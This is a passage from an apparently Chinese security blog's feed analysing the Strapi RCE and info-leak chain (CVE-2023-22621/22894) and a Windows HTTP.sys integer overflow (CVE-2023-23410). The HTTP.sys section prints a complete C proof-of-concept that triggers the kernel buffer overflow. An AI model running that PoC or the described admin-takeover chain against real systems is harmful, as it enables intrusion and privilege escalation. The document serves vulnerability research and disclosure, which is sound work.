&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">emailTemplate&lt;/span>[&lt;span style="color:#a6e22e">attribute&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">?&lt;/span> Object.&lt;span style="color:#a6e22e">assign&lt;/span>(&lt;span style="color:#a6e22e">compiled&lt;/span>, { [&lt;span style="color:#a6e22e">attribute&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">_&lt;/span>.&lt;span style="color:#a6e22e">template&lt;/span>(&lt;span style="color:#a6e22e">emailTemplate&lt;/span>[&lt;span style="color:#a6e22e">attribute&lt;/span>])(&lt;span style="color:#a6e22e">data&lt;/span>) })
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">compiled&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">strapi&lt;/span>.&lt;span style="color:#a6e22e">plugin&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;email&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">provider&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>({ ...&lt;span style="color:#a6e22e">emailOptions&lt;/span>, ...&lt;span style="color:#a6e22e">templatedAttributes&lt;/span> });
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">module&lt;/span>.&lt;span style="color:#a6e22e">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; ({
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">getProviderSettings&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">send&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sendTemplatedEmail&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>该段代码获取模板及输入内容，调用_.template(emailTemplate[attribute])(data) })渲染内容， 在此之前，渲染内容由如下代码进行校验，以避免危险内容渲染：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;use strict&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;lodash&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">invalidPatternsRegexes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">/&amp;lt;%[^=]([^&amp;lt;&amp;gt;%]*)%&amp;gt;/m&lt;/span>, &lt;span style="color:#e6db74">/\${([^{}]*)}/m&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">authorizedKeys&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;URL&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;ADMIN_URL&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;SERVER_URL&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;CODE&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;USER&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;USER.email&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;USER.username&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;TOKEN&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">matchAll&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">pattern&lt;/span>, &lt;span style="color:#a6e22e">src&lt;/span>) =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">match&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">regexPatternWithGlobal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> RegExp(&lt;span style="color:#a6e22e">pattern&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;g&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// eslint-disable-next-line no-cond-assign
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">while&lt;/span> ((&lt;span style="color:#a6e22e">match&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">regexPatternWithGlobal&lt;/span>.&lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#a6e22e">src&lt;/span>))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> [, &lt;span style="color:#a6e22e">group&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">match&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">matches&lt;/span>.&lt;span style="color:#a6e22e">push&lt;/span>(&lt;span style="color:#a6e22e">_&lt;/span>.&lt;span style="color:#a6e22e">trim&lt;/span>(&lt;span style="color:#a6e22e">group&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">isValidEmailTemplate&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">template&lt;/span>) =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">reg&lt;/span> &lt;span style="color:#66d9ef">of&lt;/span> &lt;span style="color:#a6e22e">invalidPatternsRegexes&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">reg&lt;/span>.&lt;span style="color:#a6e22e">test&lt;/span>(&lt;span style="color:#a6e22e">template&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">matchAll&lt;/span>(&lt;span style="color:#e6db74">/&amp;lt;%=([^&amp;lt;&amp;gt;%=]*)%&amp;gt;/&lt;/span>, &lt;span style="color:#a6e22e">template&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">match&lt;/span> &lt;span style="color:#66d9ef">of&lt;/span> &lt;span style="color:#a6e22e">matches&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">authorizedKeys&lt;/span>.&lt;span style="color:#a6e22e">includes&lt;/span>(&lt;span style="color:#a6e22e">match&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">module&lt;/span>.&lt;span style="color:#a6e22e">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">isValidEmailTemplate&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>该代码使用正则表达式检查邮件模板是否有非法内容，但由于正则表达式错误，导致攻击者可以使用排除列表的字符绕过检查，利用lodash的模板注入，向模板内注入恶意nodejs代码，当新注册用户时，Strapi将读取模板内容并渲染，从而导致代码执行。&lt;/p>
&lt;p>Strapi 信息泄露漏洞(CVE-2023-22894)是由于Strapi在查询时，只是在查询结果中删除了敏感字段，在实际查询语句中仍然可以使用该敏感字段，所以攻击者可以通过观察Strapi服务端返回的数据，猜测所输入的敏感字段是否正确，即攻击者可以通过暴力破解，将敏感字段爆破出来，以上利用需要一定权限。当Strapi存在管理员创建的collection时，其关系字段会映射到管理员用户，如果该collection被配置为允许未授权用户访问，则未授权攻击者可以利用该collection访问Strapi管理员用户的密码哈希和重置密码token。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/Strapi-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;p>结合两个漏洞，攻击者可以利用Strapi 信息泄露漏洞(CVE-2023-22894)爆破得到管理员用户的邮箱，之后发送重置密码请求，在通过信息泄露获取到重置密码token，通过该token强制重置管理员密码并得到管理面板访问权限，之后利用Strapi 远程代码执行漏洞(CVE-2023-22621)向邮件模板里面注入恶意代码，在注册用户触发漏洞，执行恶意nodejs代码。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/Strapi-RCE.zh-cn.assets/2.png" />&lt;/p>
&lt;p>PoC&lt;/p>
&lt;pre tabindex="0">&lt;code>https://github.com/Chestnuts4/POC
&lt;/code>&lt;/pre>&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22894-leaking-sensitive-user-information-by-filtering-on-private-fields-in-strapi-versions-471" target="_blank">https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22894-leaking-sensitive-user-information-by-filtering-on-private-fields-in-strapi-versions-471&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://github.com/strapi/strapi/security/advisories/GHSA-2h87-4q2w-v4hf" target="_blank">https://github.com/strapi/strapi/security/advisories/GHSA-2h87-4q2w-v4hf&lt;/a>
&lt;a href="https://strapi.io/blog/security-disclosure-of-vulnerabilities-cve" target="_blank">https://strapi.io/blog/security-disclosure-of-vulnerabilities-cve&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-05-05T21:06:55+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</link><pubDate>Fri, 05 May 2023 20:59:45 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>在http.sys中存在整数溢出漏洞，攻击者可以利用整数溢出漏洞绕过字段大小检查，导致在调用memcpy时传入超出缓冲区大小的长度参数，造成内存溢出。&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;ul>
&lt;li>操作系统 windows 10&lt;/li>
&lt;li>调试器 windbg&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>PoC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _WIN32_WINNT 0x0A00
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define SECURITY_WIN32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;http.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sspi.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;strsafe.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#pragma warning(disable : 4127) &lt;/span>&lt;span style="color:#75715e">// condition expression is constant
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">wmain&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#a6e22e">__in_ecount&lt;/span>(argc) &lt;span style="color:#66d9ef">wchar_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>argv[]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE hReqQueue &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTPAPI_VERSION HttpApiVersion &lt;span style="color:#f92672">=&lt;/span> HTTPAPI_VERSION_2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_SERVER_SESSION_ID ssID &lt;span style="color:#f92672">=&lt;/span> HTTP_NULL_ID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ULONG retCode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_URL_GROUP_ID urlGroupId &lt;span style="color:#f92672">=&lt;/span> HTTP_NULL_ID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 初始化HTTP服务器驱动
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> retCode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HttpInitialize&lt;/span>(HttpApiVersion,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_INITIALIZE_SERVER, &lt;span style="color:#75715e">// Flags
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> NULL &lt;span style="color:#75715e">// Reserved
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (retCode &lt;span style="color:#f92672">!=&lt;/span> NO_ERROR) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">wprintf&lt;/span>(&lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;HttpInitialize failed with %lu &lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, retCode);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> retCode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 创建服务会话
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> retCode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HttpCreateServerSession&lt;/span>(HttpApiVersion, &lt;span style="color:#f92672">&amp;amp;&lt;/span>ssID, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (retCode &lt;span style="color:#f92672">!=&lt;/span> NO_ERROR) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">wprintf&lt;/span>(&lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;HttpCreateServerSession failed with %lu &lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, retCode);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 创建url group
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> retCode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HttpCreateUrlGroup&lt;/span>(ssID, &lt;span style="color:#f92672">&amp;amp;&lt;/span>urlGroupId, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (retCode &lt;span style="color:#f92672">!=&lt;/span> NO_ERROR) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">wprintf&lt;/span>(&lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;HttpCreateUrlGroup failed with %lu &lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, retCode);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BYTE data_temp1[&lt;span style="color:#ae81ff">0x1000&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD return_len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 分配 0xfffffe0 大小的堆块
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR &lt;span style="color:#f92672">*&lt;/span>str &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HeapAlloc&lt;/span>(&lt;span style="color:#a6e22e">GetProcessHeap&lt;/span>(), &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0xfffffe0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WCHAR str_test[&lt;span style="color:#ae81ff">0xfffe&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;192.168.52.133:8081&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memcpy&lt;/span>(str, str_test, &lt;span style="color:#ae81ff">0x20&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_CHANNEL_BIND_INFO bind_info;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bind_info.Hardening &lt;span style="color:#f92672">=&lt;/span> HttpAuthenticationHardeningLegacy;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bind_info.Flags &lt;span style="color:#f92672">=&lt;/span> HTTP_CHANNEL_BIND_PROXY;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_SERVICE_BINDING_W service_binding;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HTTP_SERVICE_BINDING_BASE binding_base;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> binding_base.Type &lt;span style="color:#f92672">=&lt;/span> HttpServiceBindingTypeW;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service_binding.Base &lt;span style="color:#f92672">=&lt;/span> binding_base;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service_binding.Buffer &lt;span style="color:#f92672">=&lt;/span> str;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> service_binding.BufferSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xfffffe0&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0xf0f0f0&lt;/span>; &lt;span style="color:#75715e">// F0F0EF0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PHTTP_SERVICE_BINDING_BASE binding_base_arr[&lt;span style="color:#ae81ff">0x11&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PHTTP_SERVICE_BINDING_BASE tmp_binding_base &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>service_binding;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x11&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> binding_base_arr[i] &lt;span style="color:#f92672">=&lt;/span> tmp_binding_base;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bind_info.ServiceNames &lt;span style="color:#f92672">=&lt;/span> binding_base_arr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bind_info.NumberOfServiceNames &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> retCode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HttpSetUrlGroupProperty&lt;/span>(urlGroupId, HttpServerChannelBindProperty,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>bind_info, &lt;span style="color:#ae81ff">0x20&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> retCode &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">HttpQueryUrlGroupProperty&lt;/span>(urlGroupId, HttpServerChannelBindProperty,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>data_temp1, &lt;span style="color:#ae81ff">0x140&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>return_len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>http!UlCopyChannelBindConfigToIrp&lt;/code> 下断点，运行PoC，此时调用栈为&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-nasm" data-lang="nasm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">1:&lt;/span> &lt;span style="color:#a6e22e">kd&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> k
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">Child&lt;/span>&lt;span style="color:#f92672">-&lt;/span>SP RetAddr Call Site
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">00&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f76a8 fffff805`&lt;/span>&lt;span style="color:#ae81ff">7981&lt;/span>ae19 HTTP&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>UlCopyChannelBindConfigToIrp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">01&lt;/span> &lt;span style="color:#a6e22e">fffff889&lt;/span>&lt;span style="color:#e6db74">`cd7f76b0 fffff805`&lt;/span>&lt;span style="color:#ae81ff">7982&lt;/span>caf5 HTTP&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>UlQueryConfigGroupProperty&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x175&lt;/span>
